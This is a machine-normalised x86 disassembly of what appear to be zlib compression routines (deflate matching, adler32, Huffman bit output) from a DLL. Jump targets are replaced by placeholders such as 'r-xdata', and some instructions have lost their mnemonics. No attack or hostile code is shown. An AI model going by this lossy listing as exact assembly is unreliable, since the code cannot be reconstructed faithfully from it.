mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_10012390
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_10011090
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
sub_100113c0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov ebp [ ebx + 0x24 ]
push edi
cmp edx 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ ebx + 0x24 ]
lea ecx [ ecx + ebp - 0x106 ]
cmp eax ecx
jb r-xdata
mov edx 0xfffffffe
jmp r-xdata
test ecx ecx
jne r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edi [ ebx + 0x30 ]
mov ecx ebp
mov eax ecx
lea esi [ edi + ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebx + 0x68 ]
mov ecx [ ebx + 0x64 ]
mov eax [ ebx + 0x54 ]
sub esi ebp
sub ecx ebp
mov [ ebx + 0x68 ] esi
mov esi [ ebx + 0x44 ]
mov [ ebx + 0x64 ] ecx
mov ecx [ ebx + 0x3c ]
sub eax ebp
mov [ ebx + 0x54 ] eax
lea ecx [ ecx + esi * 2 ]
mov edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ ebx + 0x6c ]
mov esi [ ebx + 0x64 ]
push edx
mov edx [ ebx + 0x30 ]
add ecx esi
add ecx edx
push ecx
push eax
call sub_100114f0
mov ecx [ ebx + 0x6c ]
add esp 0xc
add ecx eax
mov esi ecx
mov [ ebx + 0x6c ] ecx
cmp esi 0x3
jb r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
cmp esi 0x106
jae r-xdata
mov edx [ ebx + 0x64 ]
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x50 ]
lea edi [ edx + eax ]
xor eax eax
mov al [ edi ]
mov [ ebx + 0x40 ] eax
shl eax cl
xor ecx ecx
mov cl [ edi + 0x1 ]
xor eax ecx
mov ecx [ ebx + 0x4c ]
and eax ecx
mov [ ebx + 0x40 ] eax
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
mov eax [ ebx + 0x38 ]
mov esi ebp
lea ecx [ eax + ebp * 2 ]
dec esi
mov [ ecx ] ax
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
mov eax [ ebx + 0x64 ]
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x6c ]
sub edx eax
sub edx ecx
jne r-xdata
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
add edx ebp
dec esi
mov [ ecx ] ax
jne r-xdata
sub_100114f0
mov ecx [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov eax [ ebp + 0x4 ]
mov ebx eax
cmp ebx ecx
jbe r-xdata
test ebx ebx
jne r-xdata
mov ebx ecx
sub eax ebx
mov [ ebp + 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
pop ebp
xor eax eax
pop ebx
retn
mov ecx ebx
push esi
mov esi [ ebp ]
mov eax ecx
push edi
mov edi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp ]
mov eax [ ebp + 0x8 ]
add ecx ebx
add eax ebx
pop edi
mov [ ebp ] ecx
mov [ ebp + 0x8 ] eax
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ecx [ ebp ]
mov edx [ ebp + 0x30 ]
push ebx
push ecx
push edx
call sub_10011e70
add esp 0xc
mov [ ebp + 0x30 ] eax
sub_10011570
push ecx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
cmp eax 0x3
jb r-xdata
push esi
call sub_100113c0
mov eax [ esi + 0x6c ]
add esp 0x4
cmp eax 0x106
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x30 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x4c ]
xor eax ecx
mov ecx [ esi + 0x3c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x58 ]
cmp eax 0x3
jb r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx edi
sub eax 0x106
cmp edx eax
ja r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebp
pop ecx
retn
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1698 ]
mov al [ edx + eax ]
mov edx [ esi + 0x169c ]
mov [ esp + 0xc ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1690 ]
mov edx [ esi + 0x1698 ]
mov [ ecx + edx ] al
mov eax [ esp + 0xc ]
mov ebp [ esi + 0x1698 ]
and eax 0xff
inc ebp
xor edx edx
lea eax [ esi + eax * 4 + 0x8c ]
mov [ esi + 0x1698 ] ebp
inc [ eax ]
mov ecx [ esi + 0x1694 ]
mov ebp [ esi + 0x1698 ]
dec ecx
cmp ebp ecx
mov ecx [ esi + 0x6c ]
sete dl
dec ecx
mov ebp edx
mov [ esi + 0x6c ] ecx
mov edx [ esi + 0x1698 ]
mov ebp [ esi + 0x169c ]
mov cl al
mov ax [ esi + 0x64 ]
sub ax [ esi + 0x68 ]
sub cl 0x3
mov [ esp + 0x14 ] cl
mov [ ebp + edx * 2 ] ax
mov edx [ esi + 0x1690 ]
mov ebp [ esi + 0x1698 ]
add eax 0xffff
mov [ edx + ebp ] cl
mov edx [ esi + 0x1698 ]
mov ecx [ esp + 0x14 ]
inc edx
mov [ esi + 0x1698 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x490 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x490 ]
jae r-xdata
cmp [ esi + 0x80 ] 0x2
je r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x106
jae r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
push edi
push esi
call sub_100118a0
add esp 0x8
mov [ esi + 0x58 ] eax
mov eax [ esp + 0x18 ]
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
add eax 0x3
pop ecx
retn
mov esi ebp
xor eax eax
cmp esi 0x4
pop edi
setne al
dec eax
pop esi
and eax 0x2
pop ebp
pop ecx
retn
mov ebp [ esp + 0x18 ]
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_10012390
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_10011090
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
xor eax eax
mov edx [ esi + 0x30 ]
mov eax ecx
add eax edx
jmp r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x30 ]
add ecx eax
xor eax eax
add edx ecx
mov [ esi + 0x64 ] ecx
mov ecx [ esi + 0x50 ]
mov [ esi + 0x58 ] 0x0
mov al [ edx ]
mov [ esi + 0x40 ] eax
shl eax cl
xor ecx ecx
mov cl [ edx + 0x1 ]
xor eax ecx
mov ecx [ esi + 0x4c ]
and eax ecx
mov [ esi + 0x40 ] eax
jmp r-xdata
cmp ecx 0x3
jb r-xdata
inc [ esi + eax * 4 + 0x980 ]
mov eax [ esi + 0x1694 ]
mov edx [ esi + 0x1698 ]
dec eax
xor ecx ecx
cmp edx eax
mov eax [ esi + 0x58 ]
mov edx [ esi + 0x78 ]
sete cl
mov ebp ecx
mov ecx [ esi + 0x6c ]
sub ecx eax
cmp eax edx
mov [ esi + 0x6c ] ecx
ja r-xdata
jmp r-xdata
mov edx [ esi + 0x64 ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_10012390
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_10011090
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
dec eax
mov [ esi + 0x58 ] eax
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov edi [ esi + 0x40 ]
inc edx
xor ecx ecx
mov [ esi + 0x64 ] edx
mov cl [ edx + eax + 0x2 ]
mov eax ecx
mov ecx [ esi + 0x50 ]
shl edi cl
mov ecx [ esi + 0x3c ]
xor eax edi
mov edi [ esi + 0x4c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov ecx [ esi + 0x2c ]
mov eax [ esi + 0x38 ]
and edx ecx
mov [ eax + edx * 2 ] di
mov ecx [ esi + 0x40 ]
mov edx [ esi + 0x3c ]
mov ax [ esi + 0x64 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esi + 0x58 ]
dec eax
mov [ esi + 0x58 ] eax
jne r-xdata
jmp r-xdata
inc [ esi + 0x64 ]
sub_100118a0
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov esi [ edi + 0x24 ]
mov eax [ edi + 0x74 ]
mov edx [ edi + 0x64 ]
mov ecx [ edi + 0x30 ]
mov ebp [ edi + 0x70 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x88 ]
lea ebx [ esi - 0x106 ]
add ecx edx
cmp edx ebx
mov [ esp + 0x18 ] eax
jbe r-xdata
mov [ esp + 0x1c ] 0x0
sub edx esi
add edx 0x106
mov [ esp + 0x1c ] edx
jmp r-xdata
mov edx [ edi + 0x6c ]
cmp eax edx
mov [ esp + 0x20 ] edx
jbe r-xdata
shr [ esp + 0x14 ] 0x2
mov dl [ ecx + ebp - 0x1 ]
lea ebx [ ecx + 0x102 ]
mov [ esp + 0x28 ] dl
mov dl [ ecx + ebp ]
mov [ esp + 0x13 ] dl
mov edx [ edi + 0x84 ]
cmp ebp edx
jb r-xdata
mov esi [ esp + 0x2c ]
mov [ esp + 0x18 ] edx
mov edx [ edi + 0x2c ]
mov eax [ edi + 0x38 ]
and edx esi
xor esi esi
mov si [ eax + edx * 2 ]
mov eax [ esp + 0x1c ]
cmp esi eax
jbe r-xdata
mov al [ esp + 0x28 ]
cmp [ edx + ebp - 0x1 ] al
jne r-xdata
mov eax [ esp + 0x20 ]
cmp ebp eax
ja r-xdata
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax ebp
mov edx [ edi + 0x30 ]
mov al [ esp + 0x13 ]
add edx esi
cmp [ edx + ebp ] al
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
cmp al [ ecx + 0x1 ]
jne r-xdata
add ecx 0x2
inc edx
mov edx ecx
lea ecx [ ebx - 0x102 ]
sub edx ebx
add edx 0x102
cmp edx ebp
jle r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov eax [ esp + 0x18 ]
mov [ edi + 0x68 ] esi
cmp edx eax
mov ebp edx
jge r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ edx + ecx - 0x1 ]
mov dl [ edx + ecx ]
mov [ esp + 0x28 ] al
mov [ esp + 0x13 ] dl
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
cmp ecx ebx
jb r-xdata
mov al [ ecx + 0x1 ]
inc ecx
inc edx
cmp al [ edx ]
jne r-xdata
sub_10011a10
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor edi edi
mov ebp 0x2
cmp eax 0x3
jb r-xdata
push esi
call sub_100113c0
mov eax [ esi + 0x6c ]
mov ebx [ esp + 0x20 ]
add esp 0x4
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x58 ]
mov eax [ esi + 0x68 ]
test edi edi
mov [ esi + 0x70 ] edx
mov [ esi + 0x5c ] eax
mov [ esi + 0x58 ] ebp
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x4c ]
shl eax cl
mov ecx [ esi + 0x30 ]
xor ebx ebx
mov bl [ ecx + edx + 0x2 ]
mov ecx [ esi + 0x3c ]
xor eax ebx
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x70 ]
cmp eax 0x3
jb r-xdata
mov eax [ esi + 0x78 ]
mov ecx edx
cmp ecx eax
jae r-xdata
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
cmp [ esi + 0x58 ] eax
ja r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx edi
sub eax 0x106
cmp edx eax
ja r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
mov eax [ esi + 0x64 ]
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x1698 ]
mov al [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x169c ]
mov [ esp + 0x1c ] al
mov [ ecx + edx * 2 ] 0x0
mov edx [ esi + 0x1690 ]
mov ecx [ esi + 0x1698 ]
mov [ edx + ecx ] al
mov eax [ esi + 0x1698 ]
mov edx [ esp + 0x1c ]
inc eax
and edx 0xff
mov [ esi + 0x1698 ] eax
inc [ esi + edx * 4 + 0x8c ]
mov [ esi + 0x60 ] 0x0
lea eax [ esi + edx * 4 + 0x8c ]
mov ecx [ esi + 0x64 ]
mov eax [ esi + 0x6c ]
inc ecx
dec eax
mov [ esi + 0x60 ] 0x1
mov [ esi + 0x64 ] ecx
mov [ esi + 0x6c ] eax
jmp r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1698 ]
mov al [ edx + eax - 0x1 ]
mov edx [ esi + 0x169c ]
mov [ esp + 0x10 ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1690 ]
mov edx [ esi + 0x1698 ]
mov [ ecx + edx ] al
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x1698 ]
and eax 0xff
inc edx
lea eax [ esi + eax * 4 + 0x8c ]
mov [ esi + 0x1698 ] edx
inc [ eax ]
mov ecx [ esi + 0x1694 ]
mov eax [ esi + 0x1698 ]
dec ecx
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x6c ]
mov cl [ esi + 0x70 ]
mov ebx [ esi + 0x169c ]
lea ebp [ edx + eax - 0x3 ]
mov ax dx
sub ax [ esi + 0x5c ]
mov edx [ esi + 0x1698 ]
sub cl 0x3
dec eax
mov [ esp + 0x18 ] cl
mov [ ebx + edx * 2 ] ax
mov edx [ esi + 0x1690 ]
mov ebx [ esi + 0x1698 ]
add eax 0xffff
mov [ edx + ebx ] cl
mov edx [ esi + 0x1698 ]
mov ecx [ esp + 0x18 ]
inc edx
mov [ esi + 0x1698 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x490 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x490 ]
jae r-xdata
cmp [ esi + 0x80 ] ebp
je r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x106
jae r-xdata
mov edx [ esi + 0x64 ]
mov ecx [ esi + 0x6c ]
inc edx
dec ecx
mov [ esi + 0x64 ] edx
mov edx [ esi ]
mov [ esi + 0x6c ] ecx
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
mov eax [ esi + 0x58 ]
cmp eax 0x5
ja r-xdata
push edi
push esi
call sub_100118a0
add esp 0x8
mov [ esi + 0x58 ] eax
mov eax ebx
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
pop ebx
add eax 0x3
pop ecx
retn
xor eax eax
cmp ebx 0x4
setne al
dec eax
pop edi
and eax ebp
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx edx
cmp ebx 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_10012390
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_10011090
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
mov edx [ esi + 0x30 ]
mov eax ecx
add eax edx
jmp r-xdata
mov eax [ esi + 0x70 ]
dec eax
mov [ esi + 0x70 ] eax
jne r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edi [ esi + 0x30 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x4c ]
xor eax ecx
mov ecx [ esi + 0x3c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
inc [ esi + eax * 4 + 0x980 ]
mov eax [ esi + 0x1694 ]
mov ecx [ esi + 0x1698 ]
mov edx [ esi + 0x6c ]
dec eax
xor ebx ebx
cmp ecx eax
mov eax [ esi + 0x70 ]
mov ecx 0x1
sete bl
sub ecx eax
add edx ecx
add eax 0xfffffffe
mov [ esi + 0x6c ] edx
mov [ esi + 0x70 ] eax
cmp [ esi + 0x80 ] 0x1
je r-xdata
mov edx [ esi + 0x64 ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_10012390
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_10011090
add esp 0x14
mov ecx [ esi + 0x64 ]
inc ecx
mov edx ecx
mov [ esi + 0x64 ] ecx
cmp edx ebp
ja r-xdata
mov ecx [ esi + 0x64 ]
mov ebp 0x2
inc ecx
mov [ esi + 0x60 ] 0x0
test ebx ebx
mov [ esi + 0x58 ] ebp
mov [ esi + 0x64 ] ecx
je r-xdata
mov [ esi + 0x58 ] ebp
cmp eax 0x3
jne r-xdata
mov edx [ esi + 0x54 ]
test edx edx
jl r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x68 ]
sub ecx edx
cmp ecx 0x1000
jbe r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax edx
jmp r-xdata
jmp r-xdata
sub ecx edx
push 0x0
push ecx
push eax
push esi
call sub_10012390
mov eax [ esi ]
mov edx [ esi + 0x64 ]
push eax
mov [ esi + 0x54 ] edx
call sub_10011090
mov ecx [ esi ]
add esp 0x14
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
sub_10011e70
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov ecx edi
and ecx 0xffff
shr edi 0x10
test esi esi
jne r-xdata
push ebx
mov ebx [ esp + 0x18 ]
test ebx ebx
jbe r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax edi
pop ebx
shl eax 0x10
pop edi
or eax ecx
pop esi
retn
push ebp
sub ebx eax
cmp eax 0x10
jl r-xdata
mov eax 0x15b0
test eax eax
je r-xdata
mov ebp eax
shr ebp 0x4
mov edx ebp
neg edx
shl edx 0x4
add eax edx
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov eax edi
mov edi 0xfff1
mov ecx edx
xor edx edx
div edi
test ebx ebx
mov edi edx
ja r-xdata
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
xor edx edx
mov dl [ esi ]
add esi 0x10
add ecx edx
xor edx edx
mov dl [ esi - 0xf ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xe ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xd ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xc ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xb ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xa ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x9 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x8 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x7 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x6 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x5 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x4 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x3 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x2 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x1 ]
add edi ecx
add ecx edx
add edi ecx
dec ebp
jne r-xdata
cmp ebx 0x15b0
mov eax ebx
jb r-xdata
pop ebp
sub_10011fa0
call sub_10012010
mov eax [ esp + 0x4 ]
push eax
lea ecx [ eax + 0x8c ]
lea edx [ eax + 0x980 ]
mov [ eax + 0xb10 ] ecx
lea ecx [ eax + 0xa74 ]
mov [ eax + 0xb28 ] ecx
xor ecx ecx
mov [ eax + 0xb18 ] rw-data
mov [ eax + 0xb1c ] edx
mov [ eax + 0xb24 ] rw-data
mov [ eax + 0xb30 ] rw-data
mov [ eax + 0x16b0 ] cx
mov [ eax + 0x16b4 ] ecx
mov [ eax + 0x16ac ] 0x8
call sub_10012020
pop ecx
retn
sub_10012020
mov edx [ esp + 0x4 ]
push esi
mov ecx 0x11e
xor esi esi
lea eax [ edx + 0x8c ]
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0x980 ]
mov ecx 0x1e
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0xa74 ]
mov ecx 0x13
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
mov [ edx + 0x16a4 ] esi
mov [ edx + 0x16a0 ] esi
mov [ edx + 0x16a8 ] esi
mov [ edx + 0x1698 ] esi
mov [ edx + 0x48c ] 0x1
pop esi
retn
sub_10012090
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
mov edx [ esp + 0x10 ]
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x3
mov [ eax + 0x16b4 ] ecx
mov edx [ esp + 0x10 ]
push ebx
push esi
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
push edi
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ edi + esi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
pop edi
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16b4 ] esi
pop esi
pop ebx
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x1
push ecx
push edx
push eax
call sub_10013a90
add esp 0x10
retn
sub_10012130
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov eax 0x2
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx [ esi + 0x14 ]
shl eax cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] ax
mov al [ esi + 0x16b0 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x16b1 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov cx 0x10
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x16b4 ]
sub cx ax
mov edx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16b4 ] eax
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx edx
mov [ esi + 0x16b4 ] ecx
and eax 0xffff
mov edi eax
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b1 ]
inc edi
mov [ esi + 0x14 ] edi
mov [ ebx + edi ] cl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx di
lea edx [ edi + edx - 0x10 ]
shr ax cl
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
xor edx edx
mov dx [ r--data ]
mov eax 0x10
sub eax edx
cmp ecx eax
mov eax [ r--data ]
jle r-xdata
mov [ esi + 0x16ac ] 0x7
pop edi
pop esi
pop ebx
retn
cmp ecx 0xd
mov eax 0x2
jle r-xdata
push esi
call sub_10013980
mov ecx [ esi + 0x16b4 ]
mov edx [ esi + 0x16ac ]
sub edx ecx
add esp 0x4
add edx 0xb
cmp edx 0x9
jge r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx [ esi + 0x14 ]
shl eax cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] ax
mov al [ esi + 0x16b0 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x16b1 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov cx 0x10
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x16b4 ]
sub cx ax
mov edx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16b4 ] eax
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx edx
mov [ esi + 0x16b4 ] ecx
and eax 0xffff
mov edi eax
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b1 ]
inc edi
mov [ esi + 0x14 ] edi
mov [ ebx + edi ] cl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx di
lea edx [ edi + edx - 0x10 ]
shr ax cl
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
xor edx edx
mov dx [ r--data ]
